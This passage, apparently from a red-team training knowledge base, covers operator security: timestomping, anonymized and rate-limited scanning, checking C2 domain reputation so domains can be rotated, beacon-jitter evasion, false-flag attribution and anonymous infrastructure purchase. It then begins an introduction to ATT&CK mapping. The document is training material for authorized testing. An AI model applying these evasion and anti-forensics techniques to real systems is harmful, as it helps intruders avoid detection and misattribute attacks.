match another file\ntouch -r /bin/ls /tmp/malware\n# Or set specific timestamp\ntouch -t 202501010800.00 /tmp/malware\n```\n\nDetection: Prefetch files, $MFT NTFS timestamps, USN Journal, and VSS copies preserve original timestamps even after timestomping.\n\n### Network OpSec\n\n```bash\n# Scan from redirectors, not your workstation\nproxychains nmap -sT -Pn TARGET_IP\n\n# Use rotating exit IPs\ntorify curl https://api.ipify.org # TOR — new circuit per session\n\n# Rate-limit scanning to stay below IDS thresholds\nnmap --scan-delay 2s --max-rate 10 TARGET_IP\n\n# Mimic legitimate browser TLS fingerprint (JA3)\n# Default curl TLS fingerprint is widely signatured\n# Use mitmproxy or custom Go HTTP client to match Chrome JA3\n```\n\n## ◈ ADVANCED\n\n### Automated Infrastructure Rotation\n\nFor long-running engagements, automate infrastructure rotation before detection:\n\n```python\n# Monitor your own infrastructure for exposure\nimport requests\n\nINFRA_DOMAINS = [\"c2.domain1.io\", \"redirect.domain2.com\"]\n\ndef check_vt_reputation(domain):\n resp = requests.get(\n f\"https://www.virustotal.com/api/v3/domains/{domain}\",\n headers={\"x-apikey\": VT_API_KEY}\n )\n data = resp.json()\n malicious = data[\"data\"][\"attributes\"][\"last_analysis_stats\"][\"malicious\"]\n return malicious > 0\n\ndef check_urlscan(domain):\n resp = requests.get(f\"https://urlscan.io/api/v1/search/?q=domain:{domain}\")\n return len(resp.json().get(\"results\", [])) > 0\n\n# Run daily: if any domain shows exposure, rotate\nfor domain in INFRA_DOMAINS:\n if check_vt_reputation(domain) or check_urlscan(domain):\n alert_operator(f\"Domain {domain} potentially burned — rotate immediately\")\n```\n\n### Traffic Timing Analysis Evasion\n\nBlue teams with NDR (Network Detection and Response) analyze beacon timing patterns:\n\n```\nDetection: beacon every 60s ± 20% jitter → NDR sees periodic pattern\nCounter: use live-network-aware jitter\n\nAdvanced jitter strategies:\n1. Business hours sync: beacon frequently 9-5, low frequency nights/weekends\n → matches legitimate SaaS polling behavior\n2. Entropy matching: sample entropy of legitimate traffic → match distribution\n3. Response-triggered polling: beacon after a legitimate site is visited\n (only beacon when user is active → looks like user-generated traffic)\n4. Packet size normalization: pad all C2 packets to fixed-size buckets\n → prevents traffic analysis via size correlation\n\n# Cobalt Strike advanced jitter:\nset sleeptime \"3600000\"; # 1 hour base\nset jitter \"50\"; # ±50% = 30-90 min range\n# Combine with prepend_append padding to normalize packet sizes\n```\n\n### False Flag Infrastructure\n\nFor engagements testing attribution capabilities or simulating nation-state actors:\n\n```\nFalse flag techniques:\n1. Infrastructure in target's known adversary country ASNs\n - Use VPS providers with Russian/Chinese/North Korean ASNs\n - Blue team may attribute to known threat actor → test attribution capability\n\n2. Inject known threat actor IOCs in post-exploitation artifacts\n - Drop known APT29 C2 profile characteristics in traffic\n - Use APT-attributed tools (but without real malware — just matching artifacts)\n\n3. Language artifacts:\n - Compile artifacts with non-English locale settings\n - Use adversary-matching timestamps (working hours in adversary timezone)\n\nNote: Document false flag intent in ROE — distinguish from actual deception\n```\n\n### Persistent Operator Security\n\nFor operators conducting many engagements:\n\n```bash\n# Engagement isolation: each engagement = dedicated VM\n# VM: isolated network, separate browser profile, VPN account unique per engagement\n# Never: copy files between engagement VMs\n\n# Secure infrastructure acquisition:\n# - Cryptocurrency (Monero preferred: untraceable) for VPS/domain purchase\n# - VPN → Tor → VPS provider for account creation\n# - Separate email per engagement for registrar contact\n# - Use VPS providers accepting crypto and not requiring real ID\n\n# Evidence handling:\n# - Encrypt all engagement data at rest: VeraCrypt volumes\n# - No cloud sync of engagement data (no Dropbox, iCloud, Google Drive)\n# - Retention policy: delete per contract terms (typically 90 days after delivery)\n# - Secure deletion: shred -u or cryptographic erasure\n\n# Physical security for operators:\n# Never work on client engagement in public spaces (coffee shops, airports)\n# Screen privacy filter mandatory\n# Full disk encryption on all devices\n```", "last_updated": "2026-03-18"}, "attck-mapping": {"slug": "attck-mapping", "title": "ATT&CK Mapping and Reporting", "category": "Reporting", "content": "# ATT&CK Mapping and Reporting\n\nMITRE ATT&CK is the authoritative adversary behavior knowledge base — cataloging tactics, techniques, and procedures observed from real threat actors. Every red team engagement should map activities to ATT&CK, both for professional reporting and to demonstrate detection coverage against relevant threat actor TTPs.\n\n## ◈ BEGINNER\n\n### What Is MITRE ATT&CK?\n\nMITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a publicly available knowledge base that describes how real-world attackers behave. It organizes attacker actions into a structured matrix so that defenders and red teamers share a common vocabulary.\n\n### Analogy\n\nThink of ATT&CK like a playbook in sports. Just as a football playbook catalogs every offensive formation and defensive scheme by name and purpose, ATT&CK catalogs every known attacker behavior by tactic (the goal) and technique (the method). When a red team runs a play, they record which play from the book they used, so the defense can study the game film and improve.\n\n### Key Terms\n\n- **Tactic**: The attacker's goal at a particular stage of an operation (e.g., \"gain initial access,\" \"move laterally,\" \"steal credentials\"). There are 14 enterprise tactics.\n- **Technique**: A specific method for achieving a tactic (e.g., \"Spearphishing Link\" is a technique under \"Initial Access\").\n- **Sub-technique**: A more granular variant of a technique (e.g., T1566.001 = Spearphishing Attachment, T1566.002 = Spearphishing Link).\n- **Procedure**: A specific, real-world implementation of a technique by a particular threat actor or tool.\n- **ATT&CK Navigator**: A web-based tool for visualizing technique coverage on the ATT&CK matrix. Red teams use it to show which techniques were executed, detected, or missed.\n- **ATT&CK ID**: A unique identifier for each technique (e.g., T1003.001 = OS Credential Dumping: LSASS Memory).\n\n### Why It Matters\n\nWithout a common framework, red team reports are subjective narratives that are hard to compare across engagements or map to defensive controls. ATT&CK provides:\n\n- **Consistent language**: Both red and blue teams understand exactly what \"T1055 - Process Injection\" means.\n- **Coverage measurement**: Organizations can see which techniques their defenses detect and which they miss.\n- **Threat-informed defense**: Map your defenses against the specific techniques used by threat actors that target your industry.\n- **Regulatory alignment**: Many compliance frameworks (NIST, CIS) now cross-reference ATT&CK technique IDs.\n- **Engagement repeatability**: Future engagements can re-test the same techniques to verify remediation.\n\n### How to Start Using ATT&CK\n\n1. Browse the matrix at `attack.mitre.org` to understand the tactic columns and technique rows.\n2.
